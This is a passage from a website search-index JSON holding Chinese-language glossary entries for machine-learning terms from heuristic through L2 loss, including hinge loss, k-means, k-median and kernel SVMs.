(graph)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#9-h","text":"","title":"9. H"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#91-heuristic","text":"\u4e00\u79cd\u975e\u6700\u4f18\u4f46\u5b9e\u7528\u7684\u95ee\u9898\u89e3\u51b3\u65b9\u6848\uff0c\u8db3\u4ee5\u7528\u4e8e\u8fdb\u884c\u6539\u8fdb\u6216\u4ece\u4e2d\u5b66\u4e60\u3002","title":"9.1. \u542f\u53d1\u6cd5 (heuristic)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#92-hidden-layer","text":"\u795e\u7ecf\u7f51\u7edc \u4e2d\u7684\u5408\u6210\u5c42\uff0c\u4ecb\u4e8e \u8f93\u5165\u5c42 \uff08\u5373\u7279\u5f81\uff09\u548c \u8f93\u51fa\u5c42 \uff08\u5373\u9884\u6d4b\uff09\u4e4b\u95f4\u3002\u795e\u7ecf\u7f51\u7edc\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u9690\u85cf\u5c42\u3002","title":"9.2. \u9690\u85cf\u5c42 (hidden layer)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#93-hinge-loss","text":"\u4e00\u7cfb\u5217\u7528\u4e8e \u5206\u7c7b \u7684 \u635f\u5931 \u51fd\u6570\uff0c\u65e8\u5728\u627e\u5230\u8ddd\u79bb\u6bcf\u4e2a\u8bad\u7ec3\u6837\u672c\u90fd\u5c3d\u53ef\u80fd\u8fdc\u7684 \u51b3\u7b56\u8fb9\u754c \uff0c\u4ece\u800c\u4f7f\u6837\u672c\u548c\u8fb9\u754c\u4e4b\u95f4\u7684\u88d5\u5ea6\u6700\u5927\u5316\u3002 KSVM \u4f7f\u7528\u5408\u9875\u635f\u5931\u51fd\u6570\uff08\u6216\u76f8\u5173\u51fd\u6570\uff0c\u4f8b\u5982\u5e73\u65b9\u5408\u9875\u635f\u5931\u51fd\u6570\uff09\u3002\u5bf9\u4e8e\u4e8c\u5143\u5206\u7c7b\uff0c\u5408\u9875\u635f\u5931\u51fd\u6570\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a loss = \\max{(0, 1 - (y' * y))} \u5176\u4e2d\"y'\"\u8868\u793a\u5206\u7c7b\u5668\u6a21\u578b\u7684\u539f\u59cb\u8f93\u51fa\uff1a y' = b + w_1 x_1 + w_2 x_2 + \\dots + w_n x_n \"y\"\u8868\u793a\u771f\u6807\u7b7e\uff0c\u503c\u4e3a -1 \u6216 +1\u3002 \u56e0\u6b64\uff0c\u5408\u9875\u635f\u5931\u4e0e (y * y') \u7684\u5173\u7cfb\u56fe\u5982\u4e0b\u6240\u793a\uff1a","title":"9.3. \u5408\u9875\u635f\u5931\u51fd\u6570 (hinge loss)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#94-holdout-data","text":"\u8bad\u7ec3\u671f\u95f4\u6545\u610f\u4e0d\u4f7f\u7528\uff08\"\u7ef4\u6301\"\uff09\u7684 \u6837\u672c \u3002 \u9a8c\u8bc1\u6570\u636e\u96c6 \u548c \u6d4b\u8bd5\u6570\u636e\u96c6 \u90fd\u5c5e\u4e8e\u7ef4\u6301\u6570\u636e\u3002\u7ef4\u6301\u6570\u636e\u6709\u52a9\u4e8e\u8bc4\u4f30\u6a21\u578b\u5411\u8bad\u7ec3\u65f6\u6240\u7528\u6570\u636e\u4e4b\u5916\u7684\u6570\u636e\u8fdb\u884c\u6cdb\u5316\u7684\u80fd\u529b\u3002\u4e0e\u57fa\u4e8e\u8bad\u7ec3\u6570\u636e\u96c6\u7684\u635f\u5931\u76f8\u6bd4\uff0c\u57fa\u4e8e\u7ef4\u6301\u6570\u636e\u96c6\u7684\u635f\u5931\u6709\u52a9\u4e8e\u66f4\u597d\u5730\u4f30\u7b97\u57fa\u4e8e\u672a\u89c1\u8fc7\u7684\u6570\u636e\u96c6\u7684\u635f\u5931\u3002","title":"9.4. \u7ef4\u6301\u6570\u636e (holdout data)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#95-hyperparameter","text":"\u5728\u6a21\u578b\u8bad\u7ec3\u7684\u8fde\u7eed\u8fc7\u7a0b\u4e2d\uff0c\u60a8\u8c03\u8282\u7684\"\u65cb\u94ae\"\u3002\u4f8b\u5982\uff0c \u5b66\u4e60\u901f\u7387 \u5c31\u662f\u4e00\u79cd\u8d85\u53c2\u6570\u3002 \u4e0e \u53c2\u6570 \u76f8\u5bf9\u3002","title":"9.5. \u8d85\u53c2\u6570 (hyperparameter)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#96-hyperplane","text":"\u5c06\u4e00\u4e2a\u7a7a\u95f4\u5212\u5206\u4e3a\u4e24\u4e2a\u5b50\u7a7a\u95f4\u7684\u8fb9\u754c\u3002\u4f8b\u5982\uff0c\u5728\u4e8c\u7ef4\u7a7a\u95f4\u4e2d\uff0c\u76f4\u7ebf\u5c31\u662f\u4e00\u4e2a\u8d85\u5e73\u9762\uff0c\u5728\u4e09\u7ef4\u7a7a\u95f4\u4e2d\uff0c\u5e73\u9762\u5219\u662f\u4e00\u4e2a\u8d85\u5e73\u9762\u3002\u5728\u673a\u5668\u5b66\u4e60\u4e2d\u66f4\u5178\u578b\u7684\u662f\uff1a\u8d85\u5e73\u9762\u662f\u5206\u9694\u9ad8\u7ef4\u5ea6\u7a7a\u95f4\u7684\u8fb9\u754c\u3002 \u6838\u652f\u6301\u5411\u91cf\u673a \u5229\u7528\u8d85\u5e73\u9762\u5c06\u6b63\u7c7b\u522b\u548c\u8d1f\u7c7b\u522b\u533a\u5206\u5f00\u6765\uff08\u901a\u5e38\u662f\u5728\u6781\u9ad8\u7ef4\u5ea6\u7a7a\u95f4\u4e2d\uff09\u3002","title":"9.6. \u8d85\u5e73\u9762 (hyperplane)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#10-i","text":"","title":"10. I"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#101-iid-independently-and-identically-distributed","text":"\u4ece\u4e0d\u4f1a\u6539\u53d8\u7684\u5206\u5e03\u4e2d\u63d0\u53d6\u7684\u6570\u636e\uff0c\u5176\u4e2d\u63d0\u53d6\u7684\u6bcf\u4e2a\u503c\u90fd\u4e0d\u4f9d\u8d56\u4e8e\u4e4b\u524d\u63d0\u53d6\u7684\u503c\u3002i.i.d. \u662f\u673a\u5668\u5b66\u4e60\u7684 \u7406\u60f3\u6c14\u4f53 - \u4e00\u79cd\u5b9e\u7528\u7684\u6570\u5b66\u7ed3\u6784\uff0c\u4f46\u5728\u73b0\u5b9e\u4e16\u754c\u4e2d\u51e0\u4e4e\u4ece\u672a\u53d1\u73b0\u8fc7\u3002\u4f8b\u5982\uff0c\u67d0\u4e2a\u7f51\u9875\u7684\u8bbf\u95ee\u8005\u5728\u77ed\u65f6\u95f4\u5185\u7684\u5206\u5e03\u53ef\u80fd\u4e3a i.i.d.\uff0c\u5373\u5206\u5e03\u5728\u8be5\u77ed\u65f6\u95f4\u5185\u6ca1\u6709\u53d8\u5316\uff0c\u4e14\u4e00\u4f4d\u7528\u6237\u7684\u8bbf\u95ee\u884c\u4e3a\u901a\u5e38\u4e0e\u53e6\u4e00\u4f4d\u7528\u6237\u7684\u8bbf\u95ee\u884c\u4e3a\u65e0\u5173\u3002\u4e0d\u8fc7\uff0c\u5982\u679c\u5c06\u65f6\u95f4\u7a97\u53e3\u6269\u5927\uff0c\u7f51\u9875\u8bbf\u95ee\u8005\u7684\u5206\u5e03\u53ef\u80fd\u5448\u73b0\u51fa\u5b63\u8282\u6027\u53d8\u5316\u3002","title":"10.1. \u72ec\u7acb\u540c\u7b49\u5206\u5e03 (i.i.d, independently and identically distributed)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#102-inference","text":"\u5728\u673a\u5668\u5b66\u4e60\u4e2d\uff0c\u63a8\u65ad\u901a\u5e38\u6307\u4ee5\u4e0b\u8fc7\u7a0b\uff1a\u901a\u8fc7\u5c06\u8bad\u7ec3\u8fc7\u7684\u6a21\u578b\u5e94\u7528\u4e8e \u65e0\u6807\u7b7e\u6837\u672c \u6765\u505a\u51fa\u9884\u6d4b\u3002\u5728\u7edf\u8ba1\u5b66\u4e2d\uff0c\u63a8\u65ad\u662f\u6307\u5728\u67d0\u4e9b\u89c2\u6d4b\u6570\u636e\u6761\u4ef6\u4e0b\u62df\u5408\u5206\u5e03\u53c2\u6570\u7684\u8fc7\u7a0b\u3002\uff08\u8bf7\u53c2\u9605 \u7ef4\u57fa\u767e\u79d1\u4e2d\u6709\u5173\u7edf\u8ba1\u5b66\u63a8\u65ad\u7684\u6587\u7ae0 \u3002\uff09","title":"10.2. \u63a8\u65ad (inference)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#103-input-function","text":"\u5728 TensorFlow \u4e2d\uff0c\u7528\u4e8e\u5c06\u8f93\u5165\u6570\u636e\u8fd4\u56de\u5230 Estimator \u7684\u8bad\u7ec3\u3001\u8bc4\u4f30\u6216\u9884\u6d4b\u65b9\u6cd5\u7684\u51fd\u6570\u3002\u4f8b\u5982\uff0c\u8bad\u7ec3\u8f93\u5165\u51fd\u6570\u4f1a\u8fd4\u56de \u8bad\u7ec3\u96c6 \u4e2d\u7684 \u4e00\u6279 \u7279\u5f81\u548c\u6807\u7b7e\u3002","title":"10.3. \u8f93\u5165\u51fd\u6570 (input function)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#104-input-layer","text":"\u795e\u7ecf\u7f51\u7edc \u4e2d\u7684\u7b2c\u4e00\u5c42\uff08\u63a5\u6536\u8f93\u5165\u6570\u636e\u7684\u5c42\uff09\u3002","title":"10.4. \u8f93\u5165\u5c42 (input layer)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#105-instance","text":"\u4e0e \u6837\u672c \u7684\u542b\u4e49\u76f8\u540c\u3002","title":"10.5. \u5b9e\u4f8b (instance)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#106-interpretability","text":"\u6a21\u578b\u7684\u9884\u6d4b\u53ef\u89e3\u91ca\u7684\u96be\u6613\u7a0b\u5ea6\u3002\u6df1\u5ea6\u6a21\u578b\u901a\u5e38\u4e0d\u53ef\u89e3\u91ca\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f88\u96be\u5bf9\u6df1\u5ea6\u6a21\u578b\u7684\u4e0d\u540c\u5c42\u8fdb\u884c\u89e3\u91ca\u3002\u76f8\u6bd4\u4e4b\u4e0b\uff0c\u7ebf\u6027\u56de\u5f52\u6a21\u578b\u548c \u5bbd\u5ea6\u6a21\u578b \u7684\u53ef\u89e3\u91ca\u6027\u901a\u5e38\u8981\u597d\u5f97\u591a\u3002","title":"10.6. \u53ef\u89e3\u91ca\u6027 (interpretability)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#107-inter-rater-agreement","text":"\u4e00\u79cd\u8861\u91cf\u6307\u6807\uff0c\u7528\u4e8e\u8861\u91cf\u5728\u6267\u884c\u67d0\u9879\u4efb\u52a1\u65f6\u8bc4\u5206\u8005\u8fbe\u6210\u4e00\u81f4\u7684\u9891\u7387\u3002\u5982\u679c\u8bc4\u5206\u8005\u672a\u8fbe\u6210\u4e00\u81f4\uff0c\u5219\u53ef\u80fd\u9700\u8981\u6539\u8fdb\u4efb\u52a1\u8bf4\u660e\u3002\u6709\u65f6\u4e5f\u79f0\u4e3a\u6ce8\u91ca\u8005\u95f4\u4e00\u81f4\u6027\u4fe1\u5ea6\u6216\u8bc4\u5206\u8005\u95f4\u53ef\u9760\u6027\u4fe1\u5ea6\u3002\u53e6\u8bf7\u53c2\u9605 Cohen's kappa \uff08\u6700\u70ed\u95e8\u7684\u8bc4\u5206\u8005\u95f4\u4e00\u81f4\u6027\u4fe1\u5ea6\u8861\u91cf\u6307\u6807\u4e4b\u4e00\uff09\u3002","title":"10.7. \u8bc4\u5206\u8005\u95f4\u4e00\u81f4\u6027\u4fe1\u5ea6 (inter-rater agreement)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#108-iteration","text":"\u6a21\u578b\u7684\u6743\u91cd\u5728\u8bad\u7ec3\u671f\u95f4\u7684\u4e00\u6b21\u66f4\u65b0\u3002\u8fed\u4ee3\u5305\u542b\u8ba1\u7b97\u53c2\u6570\u5728\u5355 \u6279\u6b21 \u6570\u636e\u4e0a\u7684\u68af\u5ea6\u635f\u5931\u3002","title":"10.8. \u8fed\u4ee3 (iteration)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#11-k","text":"","title":"11. K"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#111-k-means","text":"\u4e00\u79cd\u70ed\u95e8\u7684 \u805a\u7c7b \u7b97\u6cd5\uff0c\u7528\u4e8e\u5bf9\u975e\u76d1\u7763\u5f0f\u5b66\u4e60\u4e2d\u7684\u6837\u672c\u8fdb\u884c\u5206\u7ec4\u3002k-means \u7b97\u6cd5\u57fa\u672c\u4e0a\u4f1a\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a \u4ee5\u8fed\u4ee3\u65b9\u5f0f\u786e\u5b9a\u6700\u4f73\u7684 k \u4e2d\u5fc3\u70b9\uff08\u79f0\u4e3a \u5f62\u5fc3 \uff09\u3002 \u5c06\u6bcf\u4e2a\u6837\u672c\u5206\u914d\u5230\u6700\u8fd1\u7684\u5f62\u5fc3\u3002\u4e0e\u540c\u4e00\u4e2a\u5f62\u5fc3\u8ddd\u79bb\u6700\u8fd1\u7684\u6837\u672c\u5c5e\u4e8e\u540c\u4e00\u4e2a\u7ec4\u3002 k-means \u7b97\u6cd5\u4f1a\u6311\u9009\u5f62\u5fc3\u4f4d\u7f6e\uff0c\u4ee5\u6700\u5927\u9650\u5ea6\u5730\u51cf\u5c0f\u6bcf\u4e2a\u6837\u672c\u4e0e\u5176\u6700\u63a5\u8fd1\u5f62\u5fc3\u4e4b\u95f4\u7684\u8ddd\u79bb\u7684\u7d2f\u79ef\u5e73\u65b9\u3002 \u4ee5\u4e0b\u9762\u7684\u5c0f\u72d7\u9ad8\u5ea6\u4e0e\u5c0f\u72d7\u5bbd\u5ea6\u7684\u5173\u7cfb\u56fe\u4e3a\u4f8b\uff1a \u5982\u679c k=3\uff0c\u5219 k-means \u7b97\u6cd5\u4f1a\u786e\u5b9a\u4e09\u4e2a\u5f62\u5fc3\u3002\u6bcf\u4e2a\u6837\u672c\u90fd\u88ab\u5206\u914d\u5230\u4e0e\u5176\u6700\u63a5\u8fd1\u7684\u5f62\u5fc3\uff0c\u6700\u7ec8\u4ea7\u751f\u4e09\u4e2a\u7ec4\uff1a \u5047\u8bbe\u5236\u9020\u5546\u60f3\u8981\u786e\u5b9a\u5c0f\u3001\u4e2d\u548c\u5927\u53f7\u72d7\u6bdb\u8863\u7684\u7406\u60f3\u5c3a\u5bf8\u3002\u5728\u8be5\u805a\u7c7b\u4e2d\uff0c\u4e09\u4e2a\u5f62\u5fc3\u7528\u4e8e\u6807\u8bc6\u6bcf\u53ea\u72d7\u7684\u5e73\u5747\u9ad8\u5ea6\u548c\u5e73\u5747\u5bbd\u5ea6\u3002\u56e0\u6b64\uff0c\u5236\u9020\u5546\u53ef\u80fd\u5e94\u8be5\u6839\u636e\u8fd9\u4e09\u4e2a\u5f62\u5fc3\u786e\u5b9a\u6bdb\u8863\u5c3a\u5bf8\u3002\u8bf7\u6ce8\u610f\uff0c\u805a\u7c7b\u7684\u5f62\u5fc3\u901a\u5e38\u4e0d\u662f\u805a\u7c7b\u4e2d\u7684\u6837\u672c\u3002 \u4e0a\u56fe\u663e\u793a\u4e86 k-means \u5e94\u7528\u4e8e\u4ec5\u5177\u6709\u4e24\u4e2a\u7279\u5f81\uff08\u9ad8\u5ea6\u548c\u5bbd\u5ea6\uff09\u7684\u6837\u672c\u3002\u8bf7\u6ce8\u610f\uff0ck-means \u53ef\u4ee5\u8de8\u591a\u4e2a\u7279\u5f81\u4e3a\u6837\u672c\u5206\u7ec4\u3002","title":"11.1. k-means"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#112-k-median","text":"\u4e0e k-means \u7d27\u5bc6\u76f8\u5173\u7684\u805a\u7c7b\u7b97\u6cd5\u3002\u4e24\u8005\u7684\u5b9e\u9645\u533a\u522b\u5982\u4e0b\uff1a \u5bf9\u4e8e k-means\uff0c\u786e\u5b9a\u5f62\u5fc3\u7684\u65b9\u6cd5\u662f\uff0c\u6700\u5927\u9650\u5ea6\u5730\u51cf\u5c0f\u5019\u9009\u5f62\u5fc3\u4e0e\u5b83\u7684\u6bcf\u4e2a\u6837\u672c\u4e4b\u95f4\u7684\u8ddd\u79bb\u5e73\u65b9\u548c\u3002 \u5bf9\u4e8e k-median\uff0c\u786e\u5b9a\u5f62\u5fc3\u7684\u65b9\u6cd5\u662f\uff0c\u6700\u5927\u9650\u5ea6\u5730\u51cf\u5c0f\u5019\u9009\u5f62\u5fc3\u4e0e\u5b83\u7684\u6bcf\u4e2a\u6837\u672c\u4e4b\u95f4\u7684\u8ddd\u79bb\u603b\u548c\u3002 \u8bf7\u6ce8\u610f\uff0c\u8ddd\u79bb\u7684\u5b9a\u4e49\u4e5f\u6709\u6240\u4e0d\u540c\uff1a k-means \u91c7\u7528\u4ece\u5f62\u5fc3\u5230\u6837\u672c\u7684 \u6b27\u51e0\u91cc\u5f97\u8ddd\u79bb \u3002\uff08\u5728\u4e8c\u7ef4\u7a7a\u95f4\u4e2d\uff0c\u6b27\u51e0\u91cc\u5f97\u8ddd\u79bb\u5373\u4f7f\u7528\u52fe\u80a1\u5b9a\u7406\u6765\u8ba1\u7b97\u659c\u8fb9\u3002\uff09\u4f8b\u5982\uff0c(2,2) \u4e0e (5,-2) \u4e4b\u95f4\u7684 k-means \u8ddd\u79bb\u4e3a\uff1a \\text{\u6b27\u51e0\u91cc\u5fb7\u8ddd\u79bb} = \\sqrt[]{(2 - 5)^2 + (2 - (-2))^2} = 5 k-median \u91c7\u7528\u4ece\u5f62\u5fc3\u5230\u6837\u672c\u7684 \u66fc\u54c8\u987f\u8ddd\u79bb \u3002\u8fd9\u4e2a\u8ddd\u79bb\u662f\u6bcf\u4e2a\u7ef4\u5ea6\u4e2d\u7edd\u5bf9\u5dee\u5f02\u503c\u7684\u603b\u548c\u3002\u4f8b\u5982\uff0c(2,2) \u4e0e (5,-2) \u4e4b\u95f4\u7684 k-median \u8ddd\u79bb\u4e3a\uff1a \\text{\u66fc\u54c8\u987f\u8ddd\u79bb} = |2 - 5| + |2 - (-2)| = 7","title":"11.2. k-median"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#113-keras","text":"\u4e00\u79cd\u70ed\u95e8\u7684 Python \u673a\u5668\u5b66\u4e60 API\u3002 Keras \u80fd\u591f\u5728\u591a\u79cd\u6df1\u5ea6\u5b66\u4e60\u6846\u67b6\u4e0a\u8fd0\u884c\uff0c\u5176\u4e2d\u5305\u62ec TensorFlow\uff08\u5728\u8be5\u6846\u67b6\u4e0a\uff0cKeras \u4f5c\u4e3a tf.keras \u63d0\u4f9b\uff09\u3002","title":"11.3. Keras"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#114-ksvm-kernel-support-vector-machines","text":"\u4e00\u79cd\u5206\u7c7b\u7b97\u6cd5\uff0c\u65e8\u5728\u901a\u8fc7\u5c06\u8f93\u5165\u6570\u636e\u5411\u91cf\u6620\u5c04\u5230\u66f4\u9ad8\u7ef4\u5ea6\u7684\u7a7a\u95f4\uff0c\u6765\u6700\u5927\u5316 \u6b63\u7c7b\u522b \u548c \u8d1f\u7c7b\u522b \u4e4b\u95f4\u7684\u88d5\u5ea6\u3002\u4ee5\u67d0\u4e2a\u8f93\u5165\u6570\u636e\u96c6\u5305\u542b\u4e00\u767e\u4e2a\u7279\u5f81\u7684\u5206\u7c7b\u95ee\u9898\u4e3a\u4f8b\u3002\u4e3a\u4e86\u6700\u5927\u5316\u6b63\u7c7b\u522b\u548c\u8d1f\u7c7b\u522b\u4e4b\u95f4\u7684\u88d5\u5ea6\uff0cKSVM \u53ef\u4ee5\u5728\u5185\u90e8\u5c06\u8fd9\u4e9b\u7279\u5f81\u6620\u5c04\u5230\u767e\u4e07\u7ef4\u5ea6\u7684\u7a7a\u95f4\u3002KSVM \u4f7f\u7528 \u5408\u9875\u635f\u5931\u51fd\u6570 \u3002","title":"11.4. \u6838\u652f\u6301\u5411\u91cf\u673a (KSVM, Kernel Support Vector Machines)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#12-l","text":"","title":"12. L"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#121-l_1-l_1-loss","text":"\u4e00\u79cd \u635f\u5931 \u51fd\u6570\uff0c\u57fa\u4e8e\u6a21\u578b\u9884\u6d4b\u7684\u503c\u4e0e \u6807\u7b7e \u7684\u5b9e\u9645\u503c\u4e4b\u5dee\u7684\u7edd\u5bf9\u503c\u3002\u4e0e L_2 \u635f\u5931\u51fd\u6570 \u76f8\u6bd4\uff0c L_1 \u635f\u5931\u51fd\u6570\u5bf9\u79bb\u7fa4\u503c\u7684\u654f\u611f\u6027\u5f31\u4e00\u4e9b\u3002","title":"12.1. L_1\u00a0\u635f\u5931\u51fd\u6570 (L_1 loss)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#122-l_1-l_1-regularization","text":"\u4e00\u79cd \u6b63\u5219\u5316 \uff0c\u6839\u636e\u6743\u91cd\u7684\u7edd\u5bf9\u503c\u7684\u603b\u548c\u6765\u60e9\u7f5a\u6743\u91cd\u3002\u5728\u4f9d\u8d56 \u7a00\u758f\u7279\u5f81 \u7684\u6a21\u578b\u4e2d\uff0c L_1 \u6b63\u5219\u5316\u6709\u52a9\u4e8e\u4f7f\u4e0d\u76f8\u5173\u6216\u51e0\u4e4e\u4e0d\u76f8\u5173\u7684\u7279\u5f81\u7684\u6743\u91cd\u6b63\u597d\u4e3a 0\uff0c\u4ece\u800c\u5c06\u8fd9\u4e9b\u7279\u5f81\u4ece\u6a21\u578b\u4e2d\u79fb\u9664\u3002\u4e0e L_2 \u6b63\u5219\u5316 \u76f8\u5bf9\u3002","title":"12.2. L_1\u00a0\u6b63\u5219\u5316 (L_1 regularization)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#123-l_2-l_2-loss","text":"\u8bf7\u53c2\u9605 \u5e73\u65b9\u635f\u5931\u51fd\u6570 \u3002","title":"12.3. L_2\u00a0\u635f\u5931\u51fd\u6570 (L_2 